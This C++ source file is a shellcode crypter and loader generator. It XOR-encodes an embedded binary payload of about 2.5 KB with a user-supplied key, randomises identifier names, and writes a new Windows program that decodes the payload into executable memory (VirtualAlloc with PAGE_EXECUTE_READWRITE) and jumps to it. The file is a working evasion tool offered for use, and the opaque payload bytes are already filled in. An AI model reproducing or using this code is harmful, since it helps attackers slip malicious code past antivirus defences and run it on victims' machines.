#include <iostream>
#include <fstream>
#include <string>
#include <time.h>
#include <stdlib.h>
using namespace std;

string randString(int size){
	string a;
	for(int i = 0; i < size; i++) {
		int asc_value = rand() % 122 + 65;
		if( (asc_value <= 90 && asc_value >= 65)  || (asc_value >= 97 && asc_value <= 122))
			a += (char)asc_value;
		else --i;
	}
	return a;	
}


void creator(string fName, string aName, unsigned char *shelly, int s_c, string key, string kName){
	ofstream cout("flip-obfuscated.cpp");
	
	unsigned char encodedShelly[s_c];
	cout << "#include \"Windows.h\"" << endl;
		cout << "#include <string>" << endl;
	cout << "using namespace std;" << endl;
	for(int i = 0; i < 10; i++)
		cout << endl;
	cout << "int main(){" << endl << endl;
	cout << "string "<<kName <<"="<<"\"" << key << "\"" <<";" << endl << endl; 
	cout << "char "<<aName <<"[]" <<" = " << "\"";
	
	int j =0;
	for(int i = 0; i < s_c; i++) {
		if (j >= key.size()-1)
			j=0;
		encodedShelly[i] = shelly[i] ^ key[j];
		++j;
	}

	for(int i = 0; i < s_c; i++) {
		cout <<"\\x"<< hex << (int)encodedShelly[i];
	}
	
	cout << "\";";
	
	cout << endl << endl << endl;
	cout << "int j = 0;" << endl;
	cout << "for(int i=0; i < sizeof " << aName << "; i++){" << endl;
	cout << "if(j == "<< kName << ".size()" <<" -1) j=0;" << endl;
	cout << aName << "[" << "i" << "]" << " = " << aName << "[" << "i" << "]" << "^" << kName <<"[j]" << ";" << endl;
	cout <<"j++;";
	cout << "}";
	cout << endl << endl;
	cout << "void *" <<fName <<" = VirtualAlloc(0, " <<"sizeof " <<aName << ", MEM_COMMIT, PAGE_EXECUTE_READWRITE);" << endl;
	cout << "memcpy(" << fName << ", " << aName << ", sizeof "<<aName << ");" << endl ;
	
	cout << "((void(*)())"<<fName<<")()"<<";"<< endl;
	cout << "}";

	
	
	
	
	
}




int main() {
 //::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	unsigned seed = time(0);
	srand(seed);


	int funcNameSize = rand() % 15 + 5;
	string funcName = randString(funcNameSize);

	int arrNameSize = rand() % 13+7;
	string arrName = randString(arrNameSize);

	int keyNameSize = rand() % 19+7;
	string keyName = randString(keyNameSize);

	int ptrNameSize = rand() % 25+5;
	string ptrName = randString(ptrNameSize);

	cout << "Encoding Key= ";
	string encodeKey;
	cin >> encodeKey;

	//Replace here with ur shellcode
	unsigned char buf[] = "\xd9\xc8\xd9\x74\x24\xf4\xbf\xdf\x4b\x35\x00\x5d\x2b\xc9\xb1"                                                          "\x8f\x31\x7d\x19\x03\x7d\x19\x83\xed\xfc\x3d\xbe\x8f\x32\x5e"                                                          "\xc8\x5c\xeb\x88\x12\xe8\x28\xbc\xfb\x20\xf8\x8d\x8c\x72\xac"                                                          "\xf8\x8f\x22\x45\x81\x7e\x36\x87\x42\x5e\x63\x70\x09\xec\x07"                                                          "\x05\xc1\xed\x6e\xf4\xd8\x38\xf1\xbf\x25\x23\xf6\xf9\xe5\xe3"                                                          "\x0f\x44\x81\xd8\x68\xa0\xa3\xd9\x77\xd7\x66\x60\x41\xd8\x2a"                                                          "\x37\xa6\x4b\xde\xb6\x4e\x57\x7d\x51\x34\x90\x8d\x91\x21\xcb"                                                          "\xc6\x57\x92\x78\xbe\x36\x51\xeb\xab\x60\xec\x38\xa2\x6d\xa5"                                                          "\xb0\xde\x0c\x7c\xf3\xd9\x1d\xb4\x77\xf7\x4e\x41\xdc\x9b\xa0"                                                          "\x76\x95\x6d\xa1\x2d\x40\xa3\xd9\x5b\x68\xe5\x2c\x4f\x55\x08"                                                          "\x31\xdc\x09\x6c\x95\x25\x6b\x6d\x26\x81\xaa\xee\x58\xf1\x99"                                                          "\x07\xb3\x33\xdb\x34\xc8\xf9\x37\xa3\x0e\xe3\x8a\xdf\x53\x0a"                                                          "\xaf\x8a\x43\x97\x87\x0e\xa9\x22\x5d\xad\x18\x53\x89\x58\xd7"                                                          "\x9a\x55\xb7\x7d\x82\x9d\x6f\xf4\x6b\x67\x09\x5a\x0d\xd9\xb1"                                                          "\xf3\xf3\xe2\x05\xd3\x90\x91\xe0\xfc\x19\xb9\x75\x6f\x72\x5f"                                                          "\x1c\x33\x96\x1c\xb8\xea\x65\x09\x35\xeb\xf2\xe6\x13\x76\x22"                                                          "\xf6\x57\x2e\x94\x39\xc6\xf0\xbc\x40\xed\x6a\x05\x7a\xaf\x8c"                                                          "\x0e\x10\x82\x67\x9b\x5c\x63\xc3\xcd\xdb\x7f\x14\x0b\x02\x64"                                                          "\x34\x2c\x3a\xeb\xd9\xc5\x5e\xcd\xf5\x68\x41\xfe\x81\x01\x65"                                                          "\x65\xab\x1f\x82\xd9\xbf\xcd\x41\x60\xd3\x17\xb9\x13\xb7\x87"                                                          "\x5c\x76\x6b\x89\x7e\xc1\x10\xaa\xda\xda\xd4\xfa\x0e\x6a\x81"                                                          "\xfe\x54\x0e\x2b\x52\xd1\x9c\x02\x60\xfb\x8c\x89\x50\x25\x99"                                                          "\x87\x7b\x48\xb5\xaa\xba\x0c\x73\xe1\x05\xfe\x40\xba\x8c\x79"                                                          "\xc9\x15\xe8\xfc\xb7\x7f\x17\x7c\xe1\xaf\xd8\x4b\x96\x36\x61"                                                          "\xf2\xe3\xba\x55\x4f\x14\x3e\x14\xb1\x98\x46\x18\x74\xb7\x0a"                                                          "\xc5\xe8\x31\xef\xaf\x0d\x91\xe1\x7a\x73\x86\xfb\x95\x65\xac"                                                          "\xe6\x9f\x0b\x0d\xad\x43\x84\x50\xe2\xd8\xd6\x24\xea\x0a\xa0"                                                          "\xfd\xfe\x49\x92\x04\xc4\x9e\x66\xe4\xbf\x72\x8d\x0d\x3d\xa3"                                                          "\x2d\xfb\x89\xcf\x0a\x9b\x16\x88\xca\xda\xc7\x2c\xd1\xdc\x37"                                                          "\x09\x35\xe1\x49\x14\x19\x93\x8f\x1a\x49\x75\xcf\xdd\x7e\x92"                                                          "\x79\x5b\x0b\xeb\x80\x26\x78\xd4\x52\x77\xe9\x71\x1f\x38\x8c"                                                          "\x5a\xdb\x24\x21\x0a\x03\xf0\xf6\x2c\xc5\x26\x91\x39\x9e\x6b"                                                          "\xee\x60\x48\x9f\x32\xb1\xc8\x72\x6e\xa7\x94\x46\x51\x84\x8c"                                                          "\x26\x5b\x3a\xf7\xcd\xc6\x80\x23\x88\xce\x3c\xbe\x49\xd7\x5d"                                                          "\xc0\x7d\x1b\xf8\x1f\xff\x3c\xb8\x8f\x70\x02\x45\x8d\xcb\xae"                                                          "\xa4\xf1\x74\x42\x74\xac\x1d\x01\x73\x86\x94\x25\x33\x6c\xfe"                                                          "\xa8\x94\xc1\x3b\xf3\x63\x8a\x52\x17\xe3\x30\x0d\xb9\xc8\xd5"                                                          "\x3a\xc3\x8d\x80\x71\x0f\xee\x75\xac\x8e\x57\xf7\xa5\xc8\x32"                                                          "\x31\xfd\x4f\x26\x83\x8b\xa7\xa6\xc8\x86\x8a\xb7\xbf\x47\xfd"                                                          "\x33\x81\xac\x84\xaf\xc5\x40\x3a\x04\x9a\xb6\x4e";
//2532 bytes
	creator(funcName, arrName, buf, sizeof buf, encodeKey, keyName);
}